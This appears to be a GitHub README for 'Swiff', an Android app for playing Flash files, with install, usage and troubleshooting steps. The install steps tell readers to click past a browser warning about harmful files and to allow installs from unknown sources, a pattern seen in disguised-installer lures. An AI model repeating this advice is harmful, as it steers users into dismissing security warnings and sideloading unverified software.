# 🕹️ Swiff - Play classic flash animations on Android

[![Download Swiff](https://img.shields.io/badge/Download_Swiff-Blue-blue)](https://github.com/radiatorcapnacho195/Swiff)

Swiff brings flash games and animations to your mobile device. Many classic web games use older technology that modern browsers no longer support. This application restores access to those files. You can play your favorite games and view legacy animations directly on your Android phone or tablet.

## 🛠️ System requirements

Ensure your device meets these requirements before you start:

- Android version 8.0 or newer.
- At least 100 megabytes of free storage space.
- A stable internet connection for initial setup.
- Permission to install files from outside the official store.

## 📥 How to download and install

Follow these steps to set up Swiff on your device:

1. Visit the [official download page](https://github.com/radiatorcapnacho195/Swiff) to find the latest version of the installer.
2. Select the file ending in .apk to begin your download.
3. Your browser may show a warning that this file type can harm your device. Select OK to continue.
4. Once the download finishes, open your file manager or your browser download history.
5. Tap the downloaded file to start the installation.
6. Your phone might ask for permission to install unknown apps. Follow the on-screen prompts to allow this action.
7. Tap Install to finish the process.

## 🚀 Getting started

After installation completes, you will see the Swiff icon on your home screen. Tap the icon to launch the application. The home screen displays a simple interface where you can manage your files.

To open a game or animation, tap the plus icon in the corner of the screen. Select the file you wish to play from your device storage. Swiff loads the file automatically and prepares it for playback. 

## ⚙️ Using the player

The player interface includes basic controls to manage your experience:

- Play and Pause buttons control the current animation or game.
- The Fullscreen button improves visibility for smaller screens.
- Use the Back button to return to the selection list at any time.
- Volume sliders allow you to adjust the audio of the specific game independently from your system volume.

## 📱 Performance tips

Some complex games might run better with specific settings. If a game feels slow, try these steps:

1. Open the Swiff menu from the main screen.
2. Navigate to Settings.
3. Select Display settings.
4. Reduce the quality level to improve the speed of the animation.
5. Disable unnecessary background processes on your phone to free up memory.

## 🛡️ Safety and privacy

Swiff operates as a local container for your files. The app does not transmit your personal data to external servers. It reads only the files that you explicitly import into the library. You remain in complete control of which assets the app accesses on your internal storage.

## ❓ Troubleshooting common issues

If you encounter problems, check these solutions:

- App does not open: Ensure your Android OS is updated to the latest available version.
- File fails to load: Check if the file format is compatible with the Ruffle engine. Most standard .swf files work without issue.
- Missing audio: Ensure your phone is not in Silent mode. Some games require physical media volume to be active.
- Installation blocked: Check your security settings under Settings > Security. Ensure the option to allow installs from unknown sources is enabled for your browser.
